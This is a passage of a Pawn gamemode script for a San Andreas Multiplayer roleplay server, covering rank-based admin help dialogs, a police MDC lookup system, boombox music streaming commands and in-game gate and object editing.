	        			strcat(string,"Garage:{FFFFFF}/lock /sellgaragetomarket /enter(exit)garage 'H' to enter by a vehicle.");
	                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Garage commands",string,"Ok", "");
	          		}
	               	case 12:
	                {
						ShowPlayerDialog(playerid,DIALOG_HELP2,DIALOG_STYLE_LIST,"Admin Menu","{01DFD7}Server Moderator\n{00FF00}Junior Administrator\n{FFFF00}General Administrator\n{EE9A4D}Senior Administrator\n{FF0000}Head Administrator\n{DF013A}Community Owner\n{01DFD7}Server Mapper\n{01DFD7}Beta Tester\n{FE2EC8}Staff Observer\n{01DFD7}Faction Moderator\n{01DFD7}Gang Moderator","Select", "Cancel");
					}
				}
			}
		}
	}
	if(dialogid == DIALOG_HELP2)
	{
 		switch(response)
   		{
     		case 1:
       		{
         		switch(listitem)
           		{

	 				case 0:
	  				{
	  					if(Player[playerid][pAdmin] >= 1)
						{
		   					new string[228];
		        			strcat(string,"{FFFFFF}/a /kick /ban /sendto /fix /nwarn /rwarn");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP2,DIALOG_STYLE_MSGBOX,"Server Mod Commands",string,"Ok", "");
	           			}
	           			else NoAuth(playerid);
	     			}
	        		case 1:
	          		{
	          		    if(Player[playerid][pAdmin] >= 2)
						{
		            		new string[228];
		        			strcat(string,"/nwarn /rwarn /nunmute /runmute /kick /ban /unban /unbanip /mark /gotoloc /spec /fine /revive");
		        			strcat(string,"\n/disarm /afkcheck /tabcheck /goto /setvw /setskin /jetpack /gotocar /fly /slap /check");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP2,DIALOG_STYLE_MSGBOX,"Junior Admin Commands",string,"Ok", "");
	           			}
	           			else NoAuth(playerid);
	           		}
	               	case 2:
	                {
	                	if(Player[playerid][pAdmin] >= 3)
						{
		              		new string[228];
		        			strcat(string,"/respawn /approve /deny /getcar /freezrange /unfreezerange /gethere /ch /prison /hoseject /relog");
		        			strcat(string,"\n/freeze /unfreeze /ipcheck /car /starttalk /endtalk /forcetut /tuteject /givecookie /apropertyhelp");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP2,DIALOG_STYLE_MSGBOX,"General Admin Commands",string,"Ok", "");
						}
						else NoAuth(playerid);
	          		}
	               	case 3:
	                {
	                	if(Player[playerid][pAdmin] >= 4)
						{
		              		new string[228];
		        			strcat(string,"/eventhelp /bugs /setname /healall /sethp /setarmor /cnn /cnnn /tog /pcar");
		        			strcat(string,"\n/givegun /giverangegun /givemoney /setmoney /setstats /jihad /mole");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Senior Admin Commands",string,"Ok", "");
	           			}
	           			else NoAuth(playerid);
	         		}
	               	case 4:
	                {
	                    if(Player[playerid][pAdmin] >= 1337)
	    				{
		              		new string[228];
		        			strcat(string,"/p(chat) /explode /bigfacepalm /clearcontract /forcepaycheck /rangeban /donatorcar");
		        			strcat(string,"\n/setpassword /saveserver /gmx /donatorcar /givegunall /givecookieall");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Head Admin Commands",string,"Ok", "");
	           			}
	           			else NoAuth(playerid);
	         		}
	               	case 5:
	                {
	                    if(Player[playerid][pAdmin] == 100000)
	    				{
		              		new string[228];
		        			strcat(string,"/x(chat)/makeadmin /oremoveadmin /makehelper /oremovehelper /makemod /oremovemod /firemod");
		        			strcat(string,"\n/makemapper /firemapper /oremovemapper  /makegangmod /makefacmod /makevip /motd");
		        			strcat(string,"\n/maketester /firetester /oremovetester /makefamed /removefamed /addupdate /removeupdate");
		        			strcat(string,"\n/addtupdate /deletebug /deleteaccount /lockplayer");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Community Owner Commands",string,"Ok", "");
	           			}
	           			else NoAuth(playerid);
	        		}
	               	case 6:
	                {
	                	if(Player[playerid][pMapper])
						{
		              		new string[228];
		        			strcat(string,"/createobject /editobject /deleteobject /gotoobject /nearobject /duplicate /mc");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Server Mapper Commands",string,"Ok", "");
	           			}
	           			else NoAuth(playerid);
	         		}
	               	case 7:
	                {
	                	if(Player[playerid][pTester])
						{
		              		new string[228];
		        			strcat(string,"/te /addbug /bugs /deletebug");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Beta Tester Commands",string,"Ok", "");
	           			}
	           			else NoAuth(playerid);
	         		}
	               	case 8:
	                {
	               		if(Player[playerid][pStaffObserver])
						{
		              		new string[228];
		        			strcat(string,"/sname /sa /sadmins /skick /sban /sprison /sapprove /bigears /fly /ssetname /spcar");
		        			strcat(string,"/check /aa /relog /lockplayer /so /sfreeze /sunfreeze /sslap /goto /gotocar");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Staff Observer Commands",string,"Ok", "");
	           			}
	           			else NoAuth(playerid);
	         		}
	               	case 9:
	                {
	                	if(Player[playerid][pFacMod])
						{
		              		new string[228];
		        			strcat(string,"/makeleader /switchfac /oremoveleadership");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Faction Moderator Commands",string,"Ok", "");
	           			}
	           			else NoAuth(playerid);
	         		}
	               	case 10:
	                {
	                	if(Player[playerid][pGangMod])
						{
		              		new string[228];
		        			strcat(string,"/switchfam /fcreate /fedit /fstrike /editdrugs /givegangcookie /editpoint");
		                   	ShowPlayerDialog(playerid,DIALOG_HELP,DIALOG_STYLE_MSGBOX,"Gang Moderator Commands",string,"Ok", "");
	           			}
	           			else NoAuth(playerid);
   					}
				}
			}
		}
	}
	// MDC System
	if(dialogid == MDC_MAIN && response)
	{
 		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
	   	switch(listitem)
	    {
	        case 0:
	        {
	            ShowPlayerDialog(playerid, MDC_FIND, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | LEO GPS LOCATION", "Enter the Law Enforcment Official's Name or ID No.", "Enter", "Cancel");
	        }
	        case 1:
	        {
	            ShowPlayerDialog(playerid, MDC_BACKUP, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | BACKUP REQUEST", "Your backup request has sent to all on duty LEOs.", "OK", "");
	        }
	        case 2:
	        {
	            ShowPlayerDialog(playerid, MDC_FINDCIV, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | CIVILIAN GPS LOCATION", "Enter the Name or ID No.", "Enter", "Cancel");
	        }
	        case 3:
	        {
	            ShowPlayerDialog(playerid, MDC_CIVILIAN, DIALOG_STYLE_LIST, "SA-MDC - Logged in | CIVILIAN OPTIONS", "*Check Warrants\n*Check Crimes Record\n*Check Vehicles Registration", "OK", "Cancel");
	        }
		}
	}
	if(dialogid == MDC_FIND && response)
	{
	    new giveplayerid;
		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
		if(sscanf(inputtext, "u", giveplayerid))
		{
			ShowPlayerDialog(playerid, MDC_FIND, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | LEO GPS Location", "Enter the Law Enforcment Official's Name or ID No.", "Enter", "Cancel");
			return 1;
		}
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(giveplayerid == playerid)
				{
				    ShowPlayerDialog(playerid, MDC_FIND, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: You can't find yourself.\nEnter the Law Enforcment Official's Name or ID No.", "Enter", "Cancel");

					return 1;
				}
				if(Player[giveplayerid][pFac] == 1 || Player[giveplayerid][pFac] == 6)
				{
	    			SetPlayerMarkerForPlayer(playerid,giveplayerid,FIND_COLOR);
                    FindingPlayer[playerid] = giveplayerid;
		    		FindTime[playerid] = 1;
		    		FindTimePoints[playerid] = 30;
		    	}
		    	else
		    	{
			    	SendClientMessage(playerid, COLOR_GRAD2, " You can only find other cops!");
		    	}
			}
		}
	}
	if(dialogid == MDC_FINDCIV && response)
	{
	    new giveplayerid;
	    if(GetPlayerInterior(giveplayerid)) return SendClientMessage(playerid, COLOR_GRAD2, "[ERROR]: You're not able to reach that person.");
       	if(GetPlayerVirtualWorld(giveplayerid) != GetPlayerVirtualWorld(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "Player is in another virtual world.");
		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
		if(sscanf(inputtext, "u", giveplayerid))
		{
			ShowPlayerDialog(playerid, MDC_FINDCIV, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | CIVILIAN GPS Location", "Enter the Name or ID No.", "Enter", "Cancel");
			return 1;
		}
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(giveplayerid == playerid)
				{
				    ShowPlayerDialog(playerid, MDC_FIND, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: You can't find yourself.\nEnter the Name or ID No.", "Enter", "Cancel");

					return 1;
				}
				if(PhoneOff[giveplayerid] >= 1)
				{
	    			SetPlayerMarkerForPlayer(playerid,giveplayerid,FIND_COLOR);
                    FindingPlayer[playerid] = giveplayerid;
		    		FindTime[playerid] = 1;
		    		FindTimePoints[playerid] = 30;
		    	}
		    	else
		    	{
			    	SendClientMessage(playerid, COLOR_GRAD2, " You cant track that phone number, as the phone is off.");
		    	}
			}
		}
	}
	if(dialogid == MDC_BACKUP && response)
	{
		new string[256];
		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
		foreach(Player, i)
    	{
	    	if(IsACop(i) || IsFBI(i))
	    	{
		    	format(string, sizeof(string), "%s %s has requested a backup in his place.", RPFRN(playerid), GetName(playerid));
		    	SendClientMessage(i, COLOR_BLUE, string);
	    	}
    	}
	}
	if(dialogid == MDC_CIVILIAN && response)
	{
		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");
		switch(listitem)
		{
		    case 0: ShowPlayerDialog(playerid, MDC_CHECK, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | Warrants Check", "Enter the Person's Name or ID No.", "Enter", "Cancel");
		    case 1: ShowPlayerDialog(playerid, MDC_RECORD, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | Crimes Record Check", "Enter the Person's Name or ID No.", "Enter", "Cancel");
		    case 2: ShowPlayerDialog(playerid, MDC_VEHICLE, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | Vehicle Registration Check", "Enter the Person's Name or ID No.", "Enter", "Cancel");
	    }
	}
	if(dialogid == MDC_CHECK && response)
	{
	    if(!IsMDCPermitted(playerid))
			return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");

		new
			giveplayerid = ReturnUser(inputtext),
			string[128];

		if(Player[giveplayerid][pWanted] == 0)
		{
			format(string, sizeof(string), "%s has a clean record of warrants.", GetName(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else
		{
            format(string, sizeof(string), "%s has %d amount of warrants.", GetName(giveplayerid), Player[giveplayerid][pWanted]);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	if(dialogid == MDC_RECORD && response)
	{
	    if(!IsMDCPermitted(playerid))
			return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");

		new
			giveplayerid = ReturnUser(inputtext),
			string[128];

		if(Player[giveplayerid][pCrimes] == 0)
		{
			format(string, sizeof(string), "%s has a clean record of crimes.", GetName(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else
		{
            format(string, sizeof(string), "%s has %d amount of crimes.", GetName(giveplayerid), Player[giveplayerid][pCrimes]);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	if(dialogid == MDC_VEHICLE && response)
	{
	    if(!IsMDCPermitted(playerid))
			return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Login Failed. you're not permitted to use the MDC!");

		new
			giveplayerid = ReturnUser(inputtext),
			string[128];
		format(string, sizeof(string), "* Vehicles: 1[%s (ID:%d)] - 2[%s (ID:%d)] - 3[%s (ID:%d)] - 4[%s (ID:%d)]", RVN(GetVehicleModel(Player[giveplayerid][pVeh])), Player[giveplayerid][pVeh], RVN(GetVehicleModel(Player[giveplayerid][pVVeh])), Player[giveplayerid][pVVeh], RVN(GetVehicleModel(Player[giveplayerid][pVVVeh])), Player[giveplayerid][pVVVeh], RVN(GetVehicleModel(Player[giveplayerid][pVVVVeh])), Player[giveplayerid][pVVVVeh]);
    	SendClientMessage(playerid, COLOR_WHITE, string);
	}
	/*switch(dialogid)
	{
	    case 1:
	    {
	        if(response)
	        {
	            if(!strlen(inputtext)) return ShowPlayerDialog(playerid,1,DIALOG_STYLE_INPUT,"{DAA520}Graffiti","{FFFFFF}Enter text graffiti.\n\nMaximum number of characters: {ff0000}18","Ok","Cancel");
	            if(strlen(inputtext) > 18) { SendClientMessage(playerid,0xFF6800FF,"Forbidden to write more than 18 characters."); ShowPlayerDialog(playerid,9898,DIALOG_STYLE_INPUT,"{DAA520}Graffiti","{FFFFFF}Enter text graffiti.\n\nMaximum number of characters: {ff0000}18","Ok","Cancel"); return 1; }
             	format(GraffitiText[playerid], 128, inputtext);
	            ShowPlayerDialog(playerid,9999,DIALOG_STYLE_LIST,"{DAA520}Selects how to display color","{ffffff}Enter from list\nEnter HEX code manually","Ok","Go back");
			}
			else
			{
       			SendClientMessage(playerid,0xFF6800FF,"Drawing graffiti canceled.");
			    ResetVariables(playerid);
			}
		}
		case 2:
		{
		    if(response)
		    {
		    	switch(listitem)
		    	{
		        	case 0: ShowPlayerDialog(playerid,99999,DIALOG_STYLE_LIST,"{DAA520}Enter color for graffiti","{ffffff}White\n{ff0000}Red\n{228B22}Green\n{FFFF00}Yellow\n{104E8B}Blue\n{009ACD}Lightblue\n{696969}Grey","Ok","Go back");
		        	case 1: ShowPlayerDialog(playerid,999999,DIALOG_STYLE_INPUT,"{DAA520}Enter HEX code for graffiti","{ffffff}Enter your HEX code for graffiti\n\nList of HEX codes - {DAA520}http://en.wikipedia.org/wiki/Help:Using_colours","Ok","Go back");
				}
			}
			else
			{
                ShowPlayerDialog(playerid,9898,DIALOG_STYLE_INPUT,"{DAA520}Graffiti","{FFFFFF}Enter text graffiti.\n\nMaximum number of characters: {ff0000}18","Ok","Cancel");
			}
		}
		case 3:
		{
		    if(response)
		    {
				if(listitem == 0) { Color = "FFFFFF"; }
				else if(listitem == 1) { Color = "FF0000"; }
				else if(listitem == 2) { Color = "228B22"; }
				else if(listitem == 3) { Color = "FFFF00"; }
				else if(listitem == 4) { Color = "104E8B"; }
				else if(listitem == 5) { Color = "009ACD"; }
				else if(listitem == 6) { Color = "696969"; }
				format(GraffitiColor[playerid], 32, Color);
				ShowPlayerDialog(playerid,9494,DIALOG_STYLE_LIST,"{DAA520}Select the font for graffiti","{ffffff}Font 1 {4682B4}[Urban Riot]\n{ffffff}Font 2 {4682B4}[Bombing]\n{ffffff}Font 3 {4682B4}[Impact]\n{ffffff}Font 4 {4682B4}[Los Santos]\n{ffffff}Font 5 {4682B4}[Gangland Style]","Ok","Go back");
			}
			else
			{
			    ShowPlayerDialog(playerid,9999,DIALOG_STYLE_LIST,"{DAA520}Selects how to display color","{ffffff}Enter from list\nEnter HEX code manually","Ok","Go back");
			}
		}
		case 4:
		{
		    if(response)
		    {
		        if(!strlen(inputtext)) return ShowPlayerDialog(playerid,2,DIALOG_STYLE_LIST,"{DAA520}Selects how to display color","{ffffff}Enter from list\nEnter HEX code manually","Ok","Go back");
		        if(strlen(inputtext) != 6) { SendClientMessage(playerid,0xFF6800FF,"You entered incorrect HEX code."); ShowPlayerDialog(playerid,9797,DIALOG_STYLE_LIST,"{DAA520}Selects how to display color","{ffffff}Enter from list\nEnter HEX code manually","Ok","Go back"); return 1; }
                format(GraffitiColor[playerid], 32, inputtext);
                ShowPlayerDialog(playerid,9393,DIALOG_STYLE_LIST,"{DAA520}Select the font for graffiti","{ffffff}Font 1 {4682B4}[Urban Riot]\n{ffffff}Font 2 {4682B4}[Bombing]\n{ffffff}Font 3 {4682B4}[Impact]\n{ffffff}Font 4 {4682B4}[Los Santos]\n{ffffff}Font 5 {4682B4}[Gangland Style]","Ok","Go back");
		    }
		    else
			{
			    ShowPlayerDialog(playerid,9292,DIALOG_STYLE_LIST,"{DAA520}Selects how to display color","{ffffff}Enter from list\nEnter HEX code manually","Ok","Go back");
			}
		}
		case 5:
		{
		    if(response)
		    {
		        if(listitem == 0) { Font = "Urban Riot"; GraffitiSize[playerid] = 40; }
				else if(listitem == 1) { Font = "Bombing"; GraffitiSize[playerid] = 48; }
				else if(listitem == 2) { Font = "Impact"; GraffitiSize[playerid] = 48; }
				else if(listitem == 3) { Font = "Los Santos"; GraffitiSize[playerid] = 36; }
				else if(listitem == 4) { Font = "Gangland Style"; GraffitiSize[playerid] = 18; }
				format(GraffitiFont[playerid], 32, Font);
                ShowPlayerDialog(playerid,9191,DIALOG_STYLE_LIST,"{DAA520}Action font","View font\nSelect the font","Ok","Go back");
		    }
		    else
			{
			    ShowPlayerDialog(playerid,9090,DIALOG_STYLE_LIST,"{DAA520}Selects how to display color","{ffffff}Enter from list\nEnter HEX code manually","Ok","Go back");
			}
		}
		case 6:
		{
		    switch(listitem)
		    {
		        case 0:
				{
				    if(response)
				    {
				    	new Float:x, Float:y, Float:z, string[64];
				    	format(string, 128, "{%s}%s", GraffitiColor[playerid], GraffitiText[playerid]);
						GetPlayerPos(playerid, x,y,z);
				    	ShowFont[playerid] = CreateDynamicObject(19482, x+0.5, y, z, 0.0, 0.0, 0.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid), playerid, 200);
						SetDynamicObjectMaterialText(ShowFont[playerid], 0, string, OBJECT_MATERIAL_SIZE_256x256, GraffitiFont[playerid], GraffitiSize[playerid], 0, 0xFFFFFFFF, 0, 1);
						SendClientMessage(playerid,-1,"Near you set text with the selected settings, which will be seen for five seconds.");
						SetPlayerPos(playerid, x+0.1,y,z);
						DeleteObjectTimer[playerid] = SetTimerEx("DeleteObject",5000,false,"i",playerid);
					}
					else
					{
						ShowPlayerDialog(playerid,8989,DIALOG_STYLE_LIST,"{DAA520}Select the font for graffiti","{ffffff}Font 1 {4682B4}[Urban Riot]\n{ffffff}Font 2 {4682B4}[Bombing]\n{ffffff}Font 3 {4682B4}[Impact]\n{ffffff}Font 4 {4682B4}[Los Santos]\n{ffffff}Font 5 {4682B4}[Gangland Style]","Ok","Go back");
					}
				}
		        case 1: { CreateGraffiti(playerid); }
			}
		}
	}*/
	return 1;
}


/*IRP:agivebb(playerid, var[])
{
        if(Player[playerid][pAdmin] >=2 )
        {
        	new targetid, string[128], f_PLAYER_NAME];
        	if(sscanf(var,"u", targetid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]:/agivebb [playerid]");
        	Player[playerid][pBoombox] = 1;
        	GetPlayerName(targetid, pname, sizeof(pname));
        	format(string, sizeof(string), "You Have Given %s a Boombox", (pname));
        	SendClientMessage(playerid, COLOR_RED, string);
        	format(string, sizeof(string), "You have been given a boombox by %s", GetName(playerid));
        	SendClientMessage(playerid, COLOR_PURPLE, string);
		}
        return 1;
}*/
IRP:setbboff(playerid, var[])
{
	if(GetPVarType(playerid, "BBArea"))
 		{
		 	new string[128];
      		format(string, sizeof(string), "* %s has turned off their boombox.", GetName(playerid));
        	SendNearbyMessage(playerid, 15, string, COLOR_RED, COLOR_RED, COLOR_RED, COLOR_RED, COLOR_RED);
         	foreach(Player, i)
          		{
           		if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
             		{
               			StopStream(i);
                  	}
              	}
               DeletePVar(playerid, "BBStation");
           	}
	return 1;
}
IRP:placebb(playerid, var[])
{
    new string[128], Float:BBCoord[4];
    GetPlayerPos(playerid, BBCoord[0], BBCoord[1], BBCoord[2]);
    GetPlayerFacingAngle(playerid, BBCoord[3]);
    SetPVarFloat(playerid, "BBX", BBCoord[0]);
    SetPVarFloat(playerid, "BBY", BBCoord[1]);
    SetPVarFloat(playerid, "BBZ", BBCoord[2]);
    BBCoord[0] += (2 * floatsin(-BBCoord[3], degrees));
    BBCoord[1] += (2 * floatcos(-BBCoord[3], degrees));
    BBCoord[2] -= 1.0;
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't place a Boombox while in a vehicle.");
    if(Player[playerid][pBoombox] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a Boombox, go buy one from a 24/7");
    if(GetPVarInt(playerid, "PlacedBB")) return SendClientMessage(playerid, COLOR_GRAD2, "You already placed a Boombox - use /pickupbb");
    foreach(Player, i)
    	{
     	if(GetPVarType(i, "PlacedBB"))
      		{
        	if(IsPlayerInRangeOfPoint(playerid, 30.0, GetPVarFloat(i, "BBX"), GetPVarFloat(i, "BBY"), GetPVarFloat(i, "BBZ")))
         		{
           			SendClientMessage(playerid, COLOR_YELLOW, "You cannot put your boombox here, because there is one in the radius");
              		return 1;
                }
			}
        }
	new string2[128];
 	format(string2, sizeof(string2), "%s has placed down their boombox, near you", GetName(playerid));
  	SendNearbyMessage(playerid, 15, string2, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	SetPVarInt(playerid, "PlacedBB", CreateDynamicObject(2226, BBCoord[0], BBCoord[1], BBCoord[2], 0.0, 0.0, 0.0, .worldid = GetPlayerVirtualWorld(playerid), .interiorid = GetPlayerInterior(playerid)));
 	format(string, sizeof(string), "Boombox Owner: %s\nUse /setbb to set your boombox\n/pickupbb to Pick up your boombox", pName);
  	SetPVarInt(playerid, "BBLabel", _:CreateDynamic3DTextLabel(string, -1, BBCoord[0], BBCoord[1], BBCoord[2]+0.6, 5, .worldid = GetPlayerVirtualWorld(playerid), .interiorid = GetPlayerInterior(playerid)));
   	SetPVarInt(playerid, "BBArea", CreateDynamicSphere(BBCoord[0], BBCoord[1], BBCoord[2], 30.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid)));
   	SetPVarInt(playerid, "BBInt", GetPlayerInterior(playerid));
   	SetPVarInt(playerid, "BBVW", GetPlayerVirtualWorld(playerid));
    ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
   	ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
    return 1;
}
/*IRP:boombox(playerid, var[])
{
    ShowPlayerDialog(playerid,DIALOG_BOOMBOX,DIALOG_STYLE_LIST,"Radio List","Pop Hit's\nEnter URL\nTurn Off Boombox","Select", "Cancel");
	return 1;
}*/
IRP:setbb(playerid, var[])
{
	if(GetPVarType(playerid, "PlacedBB"))
    {
        if(IsPlayerInRangeOfPoint(playerid, 3.0, GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ")))
                {
                	if(isnull(var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /setbb [song name]");
					new string[128]; format(string, sizeof(string), "http://international-roleplay.com/music/%s.mp3", var[0]);
					foreach(Player, i)
					{
						if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
						{
							PlayStream(i, string, GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ"), 30.0, 1);
						}
					}
				}
                else
                {
                        return SendClientMessage(playerid, COLOR_GRAD2, "You're not near in your BoomBox.");
                }
    		}
    	else
    	{
        	SendClientMessage(playerid, COLOR_GRAD2, " You don't have a boombox placed down.");
    	}
    return 1;
}
IRP:pickupbb(playerid, var[])
{
	if(!GetPVarInt(playerid, "PlacedBB"))
    {
        SendClientMessage(playerid, -1, "You haven't placed a Boombox!");
    }
    if(IsPlayerInRangeOfPoint(playerid, 3.0, GetPVarFloat(playerid, "BBX"), GetPVarFloat(playerid, "BBY"), GetPVarFloat(playerid, "BBZ")))
    {
        PickUpBoombox(playerid);
        SendClientMessage(playerid, COLOR_GRAD2, "Boombox picked up successfully.");
    }
    return 1;
}
public OnPlayerEditDynamicObject(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new string[128], idx = gEditID[playerid];
	if(response == EDIT_RESPONSE_UPDATE)
	{
	    SetDynamicObjectPos(objectid, x, y, z);
		SetDynamicObjectRot(objectid, rx, ry, rz);
	}
	else if(response == EDIT_RESPONSE_CANCEL)
	{
	    SetDynamicObjectPos(objectid, gPos[playerid][0], gPos[playerid][1], gPos[playerid][2]);
		SetDynamicObjectRot(objectid, gRot[playerid][0], gRot[playerid][1], gRot[playerid][2]);
		gPos[playerid][0] = 0; gPos[playerid][1] = 0; gPos[playerid][2] = 0;
		gRot[playerid][0] = 0; gRot[playerid][1] = 0; gRot[playerid][2] = 0;
		format(string, sizeof(string), " You have canceled editing gate ID %d.", idx);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	else if(response == EDIT_RESPONSE_FINAL)
	{
		SetDynamicObjectPos(objectid, x, y, z);
		SetDynamicObjectRot(objectid, rx, ry, rz);
		if(gEdit[playerid] == 1)
		{
		    GateInfo[idx][gCX] = x;
			GateInfo[idx][gCY] = y;
			GateInfo[idx][gCZ] = z;
			GateInfo[idx][gCRX] = rx;
			GateInfo[idx][gCRY] = ry;
			GateInfo[idx][gCRZ] = rz;
			if(IsValidDynamic3DTextLabel(GateInfo[idx][gText])) DestroyDynamic3DTextLabel(GateInfo[idx][gText]);
			format(string, sizeof(string), "Gate ID: %d", idx);
			GateInfo[idx][gText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], 10);
		    gEdit[playerid] = 0;
		    gEditID[playerid] = 0;
		    format(string, sizeof(string), " You have finished editing gate ID %d's closing position.", idx);
		    SendClientMessage(playerid, COLOR_WHITE, string);
		    GateInfo[idx][gStatus] = 0;
		}
		else if(gEdit[playerid] == 2)
		{
		    GateInfo[idx][gOX] = x;
			GateInfo[idx][gOY] = y;
			GateInfo[idx][gOZ] = z;
			GateInfo[idx][gORX] = rx;
			GateInfo[idx][gORY] = ry;
			GateInfo[idx][gORZ] = rz;
			gEdit[playerid] = 0;
			gEditID[playerid] = 0;
			format(string, sizeof(string), " You have finished editing gate ID %d's opening position.", idx);
		    SendClientMessage(playerid, COLOR_WHITE, string);
		    GateInfo[idx][gStatus] = 1;
		}
	}
	idx = oEditID[playerid];
	if(response == EDIT_RESPONSE_UPDATE)
	{
	    SetDynamicObjectPos(objectid, x, y, z);
		SetDynamicObjectRot(objectid, rx, ry, rz);
	}
	else if(response == EDIT_RESPONSE_CANCEL)
	{
	    SetDynamicObjectPos(objectid, oPos[playerid][0], oPos[playerid][1], oPos[playerid][2]);
		SetDynamicObjectRot(objectid, oRot[playerid][0], oRot[playerid][1], oRot[playerid][2]);
		oPos[playerid][0] = 0; oPos[playerid][1] = 0; oPos[playerid][2] = 0;
		oRot[playerid][0] = 0; oRot[playerid][1] = 0; oRot[playerid][2] = 0;
		format(string, sizeof(string), " You have canceled editing object ID %d.", idx);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	else if(response == EDIT_RESPONSE_FINAL)
	{
		SetDynamicObjectPos(objectid, x, y, z);
		SetDynamicObjectRot(objectid, rx, ry, rz);
		if(oEdit[playerid] == 1)
		{
		    dX = ObjectInfo[idx][oX] = x;
			dY = ObjectInfo[idx][oY] = y;
			dZ = ObjectInfo[idx][oZ] = z;
			dRX = ObjectInfo[idx][oRX] = rx;
			dRY = ObjectInfo[idx][oRY] = ry;
			dRZ = ObjectInfo[idx][oRZ] = rz;
			if(IsValidDynamic3DTextLabel(ObjectInfo[idx][oText])) DestroyDynamic3DTextLabel(ObjectInfo[idx][oText]);
			//O-bjectInfo[idx][oText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, ObjectInfo[idx][oX], ObjectInfo[idx][oY], ObjectInfo[idx][oZ], 10);
		    oEdit[playerid] = 0;
		    oEditID[playerid] = 0;
		    format(string, sizeof(string), " You have finished editing object ID %d's position.", idx);
		    SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
    /*if(response == EDIT_RESPONSE_FINAL)
	{
		if(GetPVarInt(playerid, "SettingGraffiti") == 1)
		{
		    if(!IsPlayerInRangeOfPoint(playerid, 3, x, y, z))
			{
				DestroyDynamicObject(GraffitiObject[playerid]);
				DeletePVar(playerid, "SettingGraffiti");
				return SendClientMessage(playerid,0xFF6800FF,"Do not put your text away from the character.");
			}
		    GraffitiPos[playerid][0] = x;
			GraffitiPos[playerid][1] = y;
			GraffitiPos[playerid][2] = z;
			GraffitiPos[playerid][3] = rx;
			GraffitiPos[playerid][4] = ry;
			GraffitiPos[playerid][5] = rz;
			StartDrawing(playerid);
		}
	}
	if(response == EDIT_RESPONSE_CANCEL)
	{
		if(GetPVarInt(playerid, "SettingGraffiti") == 1)
		{
			DestroyDynamicObject(GraffitiObject[playerid]);
			ResetVariables(playerid);
			SendClientMessage(playerid,0xFF6800FF,"Drawing graffiti canceled.");
		}
	}*/
	return 1;
}

////////////////////////////////// STOCKS //////////////////////////////////
stock AntiAdv(playerid, text[])
{
    // Anti Adv
